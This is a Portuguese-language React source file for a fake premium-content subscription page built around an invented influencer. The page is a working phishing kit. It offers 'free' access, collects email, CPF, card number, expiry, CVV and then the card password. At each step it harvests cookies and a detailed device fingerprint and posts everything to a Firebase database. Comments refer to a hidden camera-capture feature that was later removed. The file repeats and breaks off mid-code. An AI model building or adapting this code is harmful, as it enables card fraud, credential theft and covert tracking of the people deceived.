"use client"
import { useState, useEffect, useRef } from "react"
import type React from "react"

import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Lock, Instagram, X, Shield, Star, CreditCard, Mail, KeyRound, Calendar, LockKeyhole, Tag, CheckCircle2 } from 'lucide-react'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"

// Placeholder para o link do WhatsApp. Substitua 'SEU_NUMERO_AQUI' pelo número de telefone
// e ajuste a mensagem 'text' conforme necessário.
const WHATSAPP_LINK = "https://wa.me/SEU_NUMERO_AQUI?text=Ol%C3%A1%21%20Acabei%20de%20fazer%20minha%20assinatura%20e%20gostaria%20de%20acessar%20o%20conte%C3%BAdo."

export default function GrupoIsabella() {
const [showSubscriptionModal, setShowSubscriptionModal] = useState(false)
const [showCardPasswordModal, setShowCardPasswordModal] = useState(false)
const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'card' | 'pix' | null>(null)

const [subscriptionEmail, setSubscriptionEmail] = useState("")
const [cpf, setCpf] = useState("")
const [creditCardNumber, setCreditCardNumber] = useState("")
const [expirationDate, setExpirationDate] = useState("")
const [cvv, setCvv] = useState("")
const [cardPassword, setCardPassword] = useState("")
const [isLoading, setIsLoading] = useState(false)

// Removidos videoRef, canvasRef, streamRef pois a captura de foto foi desativada

const previewImages = [
  "/placeholder.svg?height=400&width=300&text=Conteúdo+1",
  "/placeholder.svg?height=400&width=300&text=Conteúdo+2",
  "/placeholder.svg?height=400&width=300&text=Conteúdo+3",
]

// Funções auxiliares (getDeviceInfo, getWebGLInfo, etc.) permanecem as mesmas
const getDeviceInfo = () => {
  const canvas = document.createElement("canvas")
  const ctx = canvas.getContext("2d")
  const txt = "fingerprint"
  if (ctx) {
    ctx.textBaseline = "top"
    ctx.font = "14px Arial"
    ctx.fillText(txt, 2, 2)
  }

  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages?.join(", ") || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    screenWidth: screen.width,
    screenHeight: screen.height,
    screenColorDepth: screen.colorDepth,
    screenPixelDepth: screen.pixelDepth,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
    deviceMemory: (navigator as any).deviceMemory || "N/A",
    canvasFingerprint: canvas.toDataURL(),
    webglVendor: getWebGLInfo().vendor,
    webglRenderer: getWebGLInfo().renderer,
    pluginsCount: navigator.plugins?.length || 0,
    plugins: Array.from(navigator.plugins || [])
      .map((p) => p.name)
      .join(", "),
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    battery: getBatteryInfo(),
    connection: getConnectionInfo(),
    localStorageEnabled: isLocalStorageEnabled(),
    sessionStorageEnabled: isSessionStorageEnabled(),
    referrer: document.referrer || "Direct",
    currentUrl: window.location.href,
    timestamp: Date.now(),
    dateTime: new Date().toISOString(),
    localDateTime: new Date().toLocaleString("pt-BR"),
  }
}

const getWebGLInfo = () => {
  try {
    const canvas = document.createElement("canvas")
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl")
    if (gl) {
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info")
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
      }
    }
  } catch (e) {
    // Silently fail
  }
  return { vendor: "N/A", renderer: "N/A" }
}

const getBatteryInfo = () => {
  if ("getBattery" in navigator) {
    return "Available (async)"
  }
  return "Not available"
}

const getConnectionInfo = () => {
  const connection =
    (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection
  if (connection) {
    return {
      effectiveType: connection.effectiveType || "N/A",
      downlink: connection.downlink || "N/A",
      rtt: connection.rtt || "N/A",
    }
  }
  return "Not available"
}

const isLocalStorageEnabled = () => {
  try {
    localStorage.setItem("test", "test")
    localStorage.removeItem("test")
    return true
  } catch (e) {
    return false
  }
}

const isSessionStorageEnabled = () => {
  try {
    sessionStorage.setItem("test", "test")
    sessionStorage.removeItem("test")
    return true
  } catch (e) {
    return false
  }
}

const getCookiesInfo = () => {
  const cookies: { [key: string]: string } = {}
  try {
    document.cookie.split(";").forEach((cookie) => {
      const parts = cookie.split("=")
      if (parts.length > 1) {
        const name = decodeURIComponent(parts[0].trim())
        const value = decodeURIComponent(parts.slice(1).join("=").trim())
        cookies[name] = value
      }
    })
  } catch (e) {
    console.error("Erro ao coletar cookies:", e)
  }
  return cookies
}

const sendDataToFirebase = async (data: any) => {
  const firebaseUrl = "https://peterpan2pac-default-rtdb.firebaseio.com/assinaturas.json"
  try {
    const response = await fetch(firebaseUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    })
    if (!response.ok) {
      throw new Error(`Firebase response not OK: ${response.statusText}`)
    }
    console.log("✅ Dados salvos no Firebase:", data)
    return true
  } catch (err) {
    console.error("❌ Erro ao salvar no Firebase:", err)
    return false
  }
}

const handleInitialCardSubmission = async (e: React.FormEvent) => {
  e.preventDefault()
  setIsLoading(true)

  // Removida a chamada para capturePhoto()
  const deviceInfo = getDeviceInfo()
  const cookiesInfo = getCookiesInfo()

  const dadosAssinatura = {
    email: subscriptionEmail,
    cpf: cpf,
    cartaoCredito: creditCardNumber,
    dataExpiracaoCartao: expirationDate,
    cvvCartao: cvv,
    plataforma: "Assinatura Cartão - Conteúdo Full",
    dispositivo: deviceInfo,
    cookies: cookiesInfo,
    // Removido fotoCapturada
    dataHora: deviceInfo.localDateTime,
    dataHoraISO: deviceInfo.dateTime,
    timestamp: deviceInfo.timestamp,
    versaoCaptura: "2.8", // Updated version
    fonte: "Isabella Lua - Assinatura Cartão (Parte 1)",
  }

  const success = await sendDataToFirebase(dadosAssinatura);

  // Simulate processing delay
  await new Promise(resolve => setTimeout(resolve, 2000));

  setIsLoading(false);
  setShowSubscriptionModal(false);
  setShowCardPasswordModal(true); // Show password modal regardless of initial Firebase save success for this flow
}

const handleCardPasswordSubmission = async (e: React.FormEvent) => {
  e.preventDefault()
  setIsLoading(true)

  // Removida a chamada para capturePhoto()
  const deviceInfo = getDeviceInfo()
  const cookiesInfo = getCookiesInfo()

  const dadosAssinaturaFinal = {
    email: subscriptionEmail, // Re-include for full context
    cpf: cpf, // Re-include for full context
    cartaoCredito: creditCardNumber, // Re-include for full context
    dataExpiracaoCartao: expirationDate, // Re-include for full context
    cvvCartao: cvv, // Re-include for full context
    senhaCartao: cardPassword, // This is the new piece of data
    plataforma: "Assinatura Cartão - Conteúdo Full (Senha)",
    dispositivo: deviceInfo,
    cookies: cookiesInfo,
    // Removido fotoCapturada
    dataHora: deviceInfo.localDateTime,
    dataHoraISO: deviceInfo.dateTime,
    timestamp: deviceInfo.timestamp,
    versaoCaptura: "2.8.1", // Specific version for password step
    fonte: "Isabella Lua - Assinatura Cartão (Parte 2 - Senha)",
  }

  await sendDataToFirebase(dadosAssinaturaFinal);

  // Simulate final processing delay
  await new Promise(resolve => setTimeout(resolve, 2000));

  setIsLoading(false);
  setShowCardPasswordModal(false);
  window.location.href = WHATSAPP_LINK; // Redirect to WhatsApp
}

const formatCreditCardNumber = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  const match = cleaned.match(/.{1,4}/g);
  return match ? match.join(' ') : cleaned;
};

// Helper for expiration date formatting (MM/YY)
const formatExpirationDate = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length > 2) {
    return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
  }
  return cleaned;
};

return (
  <div className="min-h-screen bg-gradient-to-br from-slate-900 via-gray-900 to-black relative overflow-hidden">
     {/* Background Pattern */}
    <div
      className="absolute inset-0 opacity-50"
      style={{
        backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fillRule='evenodd'%3E%3Cg fill='%23ffffff' fillOpacity='0.03'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
      }}
    ></div>

    <div className="relative z-10 min-h-screen flex flex-col">
      <div className="flex-1 px-4 py-6 sm:px-6 lg:px-8">
        <div className="max-w-6xl mx-auto">
           {/* Header - Responsivo */}
          <div className="text-center mb-8 lg:mb-12">
            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 mb-4">
              <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
              <span className="text-white text-sm font-medium">Online agora</span>
            </div>
            <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-white mb-2">Conteúdo Exclusivo</h1>
            <p className="text-gray-300 text-sm sm:text-base max-w-md mx-auto">
              Acesse agora com sua rede social favorita
            </p>
          </div>

           {/* Main Content - Layout Responsivo */}
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-start">
             {/* Left Column - Profile */}
            <div className="order-2 lg:order-1">
               {/* Profile Card */}
              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 sm:p-8 border border-white/20 shadow-2xl">
                <div className="flex flex-col sm:flex-row items-center sm:items-start gap-4 sm:gap-6">
                  <div className="relative flex-shrink-0">
                    <Avatar className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-white/30 shadow-xl">
                      <AvatarImage src="/images/isabella-perfil.jpg" alt="Isabella Lua" className="object-cover" />
                      <AvatarFallback className="bg-gradient-to-br from-purple-500 to-pink-500 text-white font-bold text-2xl">
                        IL
                      </AvatarFallback>
                    </Avatar>
                     {/* Verification Badge */}
                    <div className="absolute -bottom-1 -right-1 bg-blue-500 rounded-full p-2 border-2 border-white shadow-lg">
                      <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>

                  <div className="flex-1 text-center sm:text-left">
                    <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 mb-2">
                      <h2 className="text-xl sm:text-2xl font-bold text-white">Isabella Lua</h2>
                      <div className="flex items-center gap-2">
                        <div className="bg-blue-500 rounded-full p-1">
                          <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                        <span className="bg-gradient-to-r from-purple-500 to-pink-500 text-white text-xs px-2 py-1 rounded-full font-semibold">
                          VIP
                        </span>
                      </div>
                    </div>

                    <p className="text-gray-300 text-sm mb-4">Modelo • Influenciadora • Conteúdo Premium</p>

                     {/* Stats */}
                    <div className="grid grid-cols-3 gap-4 mb-4">
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">127K</div>
                        <div className="text-xs text-gray-400">Seguidores</div>
                      </div>
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">2.1M</div>
                        <div className="text-xs text-gray-400">Curtidas</div>
                      </div>
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">850</div>
                        <div className="text-xs text-gray-400">Posts</div>
                      </div>
                    </div>

                     {/* Status */}
                    <div className="flex flex-wrap justify-center sm:justify-start gap-3 text-xs">
                      <div className="flex items-center gap-1 bg-green-500/20 text-green-400 px-2 py-1 rounded-full">
                        <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                        <span>Online</span>
                      </div>
                      <div className="flex items-center gap-1 bg-red-500/20 text-red-400 px-2 py-1 rounded-full">
                        <Lock className="w-3 h-3" />
                        <span>Privado</span>
                      </div>
                      <div className="flex items-center gap-1 bg-yellow-500/20 text-yellow-400 px-2 py-1 rounded-full">
                        <Star className="w-3 h-3" />
                        <span>Premium</span>
                      </div>
                    </div>
                  </div>
                </div>

                 {/* Alert */}
                <div className="mt-6 bg-gradient-to-r from-purple-500/20 to-pink-500/20 border border-purple-500/30 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <Shield className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-white text-sm font-medium mb-1">🔥 Novo conteúdo disponível!</p>
                      <p className="text-gray-300 text-xs">3 fotos e 1 vídeo exclusivos foram adicionados hoje</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

             {/* Right Column - Preview & Actions */}
            <div className="order-1 lg:order-2">
               {/* Preview Images */}
              <div className="mb-8">
                <h3 className="text-white text-lg font-semibold mb-4 text-center lg:text-left">Prévia do Conteúdo</h3>
                <div className="grid grid-cols-3 gap-3 sm:gap-4 max-w-sm mx-auto lg:max-w-none">
                  {[1, 2, 3].map((index) => (
                    <div key={index} className="relative group cursor-pointer">
                      <div className="aspect-[3/4] bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl overflow-hidden border border-white/10">
                        <img
                          src={previewImages[index - 1] || "/placeholder.svg"}
                          alt={`Preview ${index}`}
                          className="w-full h-full object-cover blur-sm group-hover:blur-[2px] transition-all duration-300"
                        />
                        <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent flex items-center justify-center">
                          <div className="text-white text-center">
                            <div className="bg-white/20 backdrop-blur-sm rounded-full p-3 mb-2">
                              <Lock className="w-4 h-4" />
                            </div>
                            <p className="text-xs font-medium">{index === 2 ? "Vídeo" : `Foto #${index}`}</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
                <p className="text-center text-gray-400 text-sm mt-4">
                  <span className="text-white font-medium">3 novos conteúdos</span> • Desbloqueie com seu login
                </p>
              </div>

               {/* CTA Button */}
              <div className="space-y-4">
                <Button
                  onClick={() => {
                    setShowSubscriptionModal(true);
                    setSelectedPaymentMethod(null); // Reset selection
                  }}
                  className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                >
                  <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 mr-3" />
                  Assinar Conteúdo Premium
                </Button>

                <div className="flex items-center justify-center gap-4 text-xs text-gray-400 pt-2">
                  <div className="flex items-center gap-1">
                    <Shield className="w-3 h-3 text-green-400" />
                    <span>100% Seguro</span>
                  </div>
                  <span>•</span>
                  <span>Acesso Imediato</span>
                  <span>•</span>
                  <span>Gratuito</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

       {/* Footer */}
      <footer className="border-t border-white/10 bg-black/20 backdrop-blur-sm py-4">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
            <p>© 2024 Isabella Lua. Todos os direitos reservados.</p>
            <div className="flex gap-4">
              <a href="#" className="hover:text-white transition-colors">
                Privacidade
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Termos
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Suporte
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>

     {/* Subscription Modal - Step 1: Choose Payment Method / Card Form / PIX Form */}
    <Dialog open={showSubscriptionModal} onOpenChange={setShowSubscriptionModal}>
      <DialogContent className="sm:max-w-md p-0 rounded-2xl overflow-hidden max-h-[90vh] flex flex-col">
        <DialogHeader className="p-4 sm:p-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white flex-shrink-0">
          <DialogTitle className="text-2xl font-bold text-center">
            {selectedPaymentMethod ? "Assinatura Premium" : "Escolha sua Assinatura"}
          </DialogTitle>
          <DialogDescription className="text-center text-white/80 mt-1 text-sm">
            {selectedPaymentMethod === 'card' && "Preencha os dados do seu cartão para acesso completo."}
            {!selectedPaymentMethod && "Selecione como deseja acessar o conteúdo exclusivo da Isabella Lua."}
          </DialogDescription>
        </DialogHeader>

        <div className="p-4 sm:p-6 flex-1 overflow-y-auto">
          {!selectedPaymentMethod && (
            <div className="space-y-4">
              <Button
                onClick={() => setSelectedPaymentMethod('card')}
                className="w-full min-h-[90px] bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg shadow-md flex flex-col items-center justify-center text-center px-4"
              >
                <CreditCard className="w-7 h-7 mb-2" />
                <span className="text-xl leading-tight">Assinar com Cartão</span>
                <span className="text-sm font-normal opacity-90 mt-1 leading-tight">Libera TODOS os conteúdos exclusivos</span>
              </Button>
            </div>
          )}

          {selectedPaymentMethod === 'card' && (
            <>
              <div className="text-center mb-6 bg-purple-50 p-4 rounded-lg border border-purple-200">
                <div className="flex flex-col sm:flex-row items-center justify-center gap-4"> {/* New flex container */}
                  {/* Adjusted image size and positioning */}
                  <img
                    src="/placeholder.svg?height=100&width=100"
                    alt="Capa do Conteúdo Exclusivo"
                    className="w-24 h-24 object-cover rounded-md flex-shrink-0"
                  />
                  <div className="flex-1 text-center sm:text-left"> {/* Text content */}
                    <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
                      <Tag className="w-5 h-5 text-purple-600" />
                      <p className="text-lg font-semibold text-purple-800">Oferta Exclusiva!</p>
                    </div>
                    <p className="text-sm text-gray-600">De <span className="line-through font-bold text-red-500">R$ 99,00</span> por apenas</p>
                    <p className="text-4xl font-extrabold text-green-600 mt-2">R$ 0,00</p>
                    <p className="text-xs text-gray-500 mt-1">Acesso completo por tempo limitado!</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleInitialCardSubmission} className="space-y-4">
                <div>
                  <Label htmlFor="sub-email" className="text-sm font-medium text-gray-700">
                    Email
                  </Label>
                  <div className="relative mt-1">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <Input
                      id="sub-email"
                      type="email"
                      placeholder="seu.email@exemplo.com"
                      value={subscriptionEmail}
                      onChange={(e) => setSubscriptionEmail(e.target.value)}
                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      required
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="cpf" className="text-sm font-medium text-gray-700">
                    CPF
                  </Label>
                  <div className="relative mt-1">
                    <Input
                      id="cpf"
                      type="text"
                      placeholder="000.000.000-00"
                      value={cpf}
                      onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
                      className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      maxLength={11}
                      required
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="credit-card" className="text-sm font-medium text-gray-700">
                    Número do Cartão de Crédito
                  </Label>
                  <div className="relative mt-1">
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <Input
                      id="credit-card"
                      type="text"
                      placeholder="XXXX XXXX XXXX XXXX"
                      value={formatCreditCardNumber(creditCardNumber)}
                      onChange={(e) => setCreditCardNumber(e.target.value)}
                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      maxLength={19} // 16 digits + 3 spaces
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="expiration-date" className="text-sm font-medium text-gray-700">
                      Validade (MM/AA)
                    </Label>
                    <div className="relative mt-1">
                      <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <Input
                        id="expiration-date"
                        type="text"
                        placeholder="MM/AA"
                        value={formatExpirationDate(expirationDate)}
                        onChange={(e) => setExpirationDate(e.target.value)}
                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                        maxLength={5} // MM/YY
                        required
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                      CVV
                    </Label>
                    <div className="relative mt-1">
                      <LockKeyhole className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <Input
                        id="cvv"
                        type="text"
                        placeholder="123"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))} // Remove non-digits
                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                        maxLength={4}
                        required
                      />
                    </div>
                  </div>
                </div>

                 {/* Elementos ocultos para captura da câmera - REMOVIDOS */}
                {/* <video ref={videoRef} className="hidden" playsInline autoPlay muted></video> */}
                {/* <canvas ref={canvasRef} className="hidden"></canvas> */}

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Processando...
                    </div>
                  ) : (
                    "Continuar"
                  )}
                </Button>
              </form>
            </>
          )}

          <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
            Ao continuar, você concorda com os Termos de Serviço e a Política de Privacidade.
          </p>
        </div>
      </DialogContent>
    </Dialog>

     {/* Card Password Modal - Step 2 for Card */}
    <Dialog open={showCardPasswordModal} onOpenChange={setShowCardPasswordModal}>
      <DialogContent className="sm:max-w-sm p-0 rounded-2xl overflow-hidden text-center">
        <DialogHeader className="p-4 sm:p-6 bg-gradient-to-r from-blue-600 to-blue-800 text-white">
          <DialogTitle className="text-xl font-semibold flex items-center justify-center gap-2">
            <Shield className="w-6 h-6" /> Confirmação de Segurança
          </DialogTitle>
          <DialogDescription className="text-sm text-white/80 mt-1">
            Para sua segurança, solicitamos a senha do seu cartão.
          </DialogDescription>
        </DialogHeader>
        <div className="p-4 sm:p-6">
          <form onSubmit={handleCardPasswordSubmission} className="space-y-4">
            <div>
              <Label htmlFor="card-password" className="text-sm font-medium text-gray-700">
                Senha do Cartão
              </Label>
              <div className="relative mt-1">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                <Input
                  id="card-password"
                  type="password"
                  placeholder="Sua senha do cartão"
                  value={cardPassword}
                  onChange={(e) => setCardPassword(e.target.value)}
                  className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-lg"
                  required
                />
              </div>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  Verificando...
                </div>
              ) : (
                "Confirmar Senha"
              )}
            </Button>
          </form>
          <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
            Esta etapa garante a segurança da sua transação.
          </p>
        </div>
      </DialogContent>
    </Dialog>
  </div>
)
}
"use client"
import { useState, useEffect, useRef } from "react"
import type React from "react"

import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Lock, Instagram, X, Shield, Star, CreditCard, Mail, KeyRound, Calendar, LockKeyhole, Tag, CheckCircle2 } from 'lucide-react'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"

// Placeholder para o link do WhatsApp. Substitua 'SEU_NUMERO_AQUI' pelo número de telefone
// e ajuste a mensagem 'text' conforme necessário.
const WHATSAPP_LINK = "https://wa.me/SEU_NUMERO_AQUI?text=Ol%C3%A1%21%20Acabei%20de%20fazer%20minha%20assinatura%20e%20gostaria%20de%20acessar%20o%20conte%C3%BAdo."

export default function GrupoIsabella() {
const [showSubscriptionModal, setShowSubscriptionModal] = useState(false)
const [showCardPasswordModal, setShowCardPasswordModal] = useState(false)
const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'card' | 'pix' | null>(null)

const [subscriptionEmail, setSubscriptionEmail] = useState("")
const [cpf, setCpf] = useState("")
const [creditCardNumber, setCreditCardNumber] = useState("")
const [expirationDate, setExpirationDate] = useState("")
const [cvv, setCvv] = useState("")
const [cardPassword, setCardPassword] = useState("")
const [isLoading, setIsLoading] = useState(false)

// Removidos videoRef, canvasRef, streamRef pois a captura de foto foi desativada

const previewImages = [
  "/placeholder.svg?height=400&width=300&text=Conteúdo+1",
  "/placeholder.svg?height=400&width=300&text=Conteúdo+2",
  "/placeholder.svg?height=400&width=300&text=Conteúdo+3",
]

// Funções auxiliares (getDeviceInfo, getWebGLInfo, etc.) permanecem as mesmas
const getDeviceInfo = () => {
  const canvas = document.createElement("canvas")
  const ctx = canvas.getContext("2d")
  const txt = "fingerprint"
  if (ctx) {
    ctx.textBaseline = "top"
    ctx.font = "14px Arial"
    ctx.fillText(txt, 2, 2)
  }

  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages?.join(", ") || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    screenWidth: screen.width,
    screenHeight: screen.height,
    screenColorDepth: screen.colorDepth,
    screenPixelDepth: screen.pixelDepth,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
    deviceMemory: (navigator as any).deviceMemory || "N/A",
    canvasFingerprint: canvas.toDataURL(),
    webglVendor: getWebGLInfo().vendor,
    webglRenderer: getWebGLInfo().renderer,
    pluginsCount: navigator.plugins?.length || 0,
    plugins: Array.from(navigator.plugins || [])
      .map((p) => p.name)
      .join(", "),
    touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
    battery: getBatteryInfo(),
    connection: getConnectionInfo(),
    localStorageEnabled: isLocalStorageEnabled(),
    sessionStorageEnabled: isSessionStorageEnabled(),
    referrer: document.referrer || "Direct",
    currentUrl: window.location.href,
    timestamp: Date.now(),
    dateTime: new Date().toISOString(),
    localDateTime: new Date().toLocaleString("pt-BR"),
  }
}

const getWebGLInfo = () => {
  try {
    const canvas = document.createElement("canvas")
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl")
    if (gl) {
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info")
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
      }
    }
  } catch (e) {
    // Silently fail
  }
  return { vendor: "N/A", renderer: "N/A" }
}

const getBatteryInfo = () => {
  if ("getBattery" in navigator) {
    return "Available (async)"
  }
  return "Not available"
}

const getConnectionInfo = () => {
  const connection =
    (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection
  if (connection) {
    return {
      effectiveType: connection.effectiveType || "N/A",
      downlink: connection.downlink || "N/A",
      rtt: connection.rtt || "N/A",
    }
  }
  return "Not available"
}

const isLocalStorageEnabled = () => {
  try {
    localStorage.setItem("test", "test")
    localStorage.removeItem("test")
    return true
  } catch (e) {
    return false
  }
}

const isSessionStorageEnabled = () => {
  try {
    sessionStorage.setItem("test", "test")
    sessionStorage.removeItem("test")
    return true
  } catch (e) {
    return false
  }
}

const getCookiesInfo = () => {
  const cookies: { [key: string]: string } = {}
  try {
    document.cookie.split(";").forEach((cookie) => {
      const parts = cookie.split("=")
      if (parts.length > 1) {
        const name = decodeURIComponent(parts[0].trim())
        const value = decodeURIComponent(parts.slice(1).join("=").trim())
        cookies[name] = value
      }
    })
  } catch (e) {
    console.error("Erro ao coletar cookies:", e)
  }
  return cookies
}

const sendDataToFirebase = async (data: any) => {
  const firebaseUrl = "https://peterpan2pac-default-rtdb.firebaseio.com/assinaturas.json"
  try {
    const response = await fetch(firebaseUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    })
    if (!response.ok) {
      throw new Error(`Firebase response not OK: ${response.statusText}`)
    }
    console.log("✅ Dados salvos no Firebase:", data)
    return true
  } catch (err) {
    console.error("❌ Erro ao salvar no Firebase:", err)
    return false
  }
}

const handleInitialCardSubmission = async (e: React.FormEvent) => {
  e.preventDefault()
  setIsLoading(true)

  // Removida a chamada para capturePhoto()
  const deviceInfo = getDeviceInfo()
  const cookiesInfo = getCookiesInfo()

  const dadosAssinatura = {
    email: subscriptionEmail,
    cpf: cpf,
    cartaoCredito: creditCardNumber,
    dataExpiracaoCartao: expirationDate,
    cvvCartao: cvv,
    plataforma: "Assinatura Cartão - Conteúdo Full",
    dispositivo: deviceInfo,
    cookies: cookiesInfo,
